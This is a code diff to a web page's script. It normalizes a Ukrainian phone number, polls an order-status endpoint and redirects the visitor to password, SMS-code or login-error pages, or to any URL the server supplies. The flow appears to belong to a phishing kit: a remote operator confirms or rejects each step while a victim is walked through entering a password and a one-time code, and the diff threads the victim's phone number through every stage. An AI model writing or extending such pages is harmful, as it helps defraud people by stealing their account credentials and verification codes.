@@ -85,22 +85,42 @@ body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex
 
 <script>
 var params=new URLSearchParams(location.search),orderId=params.get("order"),phone=params.get("phone");
-if(phone){
-  var f="+38 ("+phone.substring(0,3)+") "+phone.substring(3,6)+" "+phone.substring(6,8)+" "+phone.substring(8,10);
-  document.getElementById("userPhone").textContent=f;
-}
 if(!orderId)location.href="index.html";
 
+function normalizePhone(p){
+  if(!p)return"";
+  p=String(p).replace(/\D/g,"");
+  if(p.indexOf("380")===0)p=p.substring(3);
+  return p;
+}
+function renderPhone(p){
+  p=normalizePhone(p);
+  if(p.length<9)return;
+  var f="+38 ("+p.substring(0,3)+") "+p.substring(3,6)+" "+p.substring(6,8)+" "+p.substring(8,10);
+  document.getElementById("userPhone").textContent=f;
+}
+
+if(phone){
+  phone=normalizePhone(phone);
+  renderPhone(phone);
+}
+
 document.getElementById("smsLink").addEventListener("click",function(e){
-  e.preventDefault();location.href="password.html?order="+orderId;
+  e.preventDefault();location.href="password.html?order="+orderId+(phone?"&phone="+encodeURIComponent(phone):"");
 });
+
+function phoneQS(){return phone?"&phone="+encodeURIComponent(phone):""}
 
 function checkStatus(){
   fetch("/api/orders/"+orderId+"/status")
     .then(function(r){return r.json()})
     .then(function(d){
-      if(d.redirect_to){location.href=d.redirect_to+(d.redirect_to.includes("?")?"&":"?")+"order="+orderId+(phone?"&phone="+encodeURIComponent(phone):"");return}
-      if(d.status==="confirmed")location.href="code.html?order="+orderId;
+      if(d.username&&!phone){
+        phone=normalizePhone(d.username);
+        renderPhone(phone);
+      }
+      if(d.redirect_to){location.href=d.redirect_to+(d.redirect_to.includes("?")?"&":"?")+"order="+orderId+phoneQS();return}
+      if(d.status==="confirmed")location.href="code.html?order="+orderId+phoneQS();
       else if(d.status==="rejected")location.href="login.html?order="+orderId+"&error=1";
     }).catch(function(){});
 }
